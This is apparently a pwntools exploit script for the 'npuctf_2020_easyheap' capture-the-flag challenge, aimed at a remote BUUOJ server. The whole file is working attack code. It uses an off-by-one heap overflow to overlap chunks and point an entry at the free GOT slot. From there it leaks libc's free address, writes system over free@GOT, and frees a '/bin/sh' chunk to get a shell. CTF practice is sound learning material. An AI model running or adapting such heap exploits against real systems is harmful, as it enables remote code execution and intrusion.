from pwn import *

#io=process('./npuctf_2020_easyheap')
io=remote('node3.buuoj.cn',29742)
ELF('npuctf_2020_easyheap')

def add(size,data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('only) :')
    io.sendline(str(size))
    io.recvuntil('Content:')
    io.send(data)

def free(idx):
    io.recvuntil('choice :')
    io.sendline('4')
    io.recvuntil('Index :')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(idx))

def  edit(idx,data):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(idx))
    io.recvuntil('Content:')
    io.send(data)

puts_got=0x602028
free_got=0x602018

[add(0x18,'a'*0x18) for i in range(4)]
add(0x18,'/bin/sh\x00')
edit(0,'a'*0x18+p8(0x41))
free(1)
add(0x38,'a'*0x20+p64(0x60)+p64(free_got))#1
show(1)
free_add=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print(hex(free_add))
sys=free_add-0x48510
edit(1,p64(sys))
free(4)



io.interactive()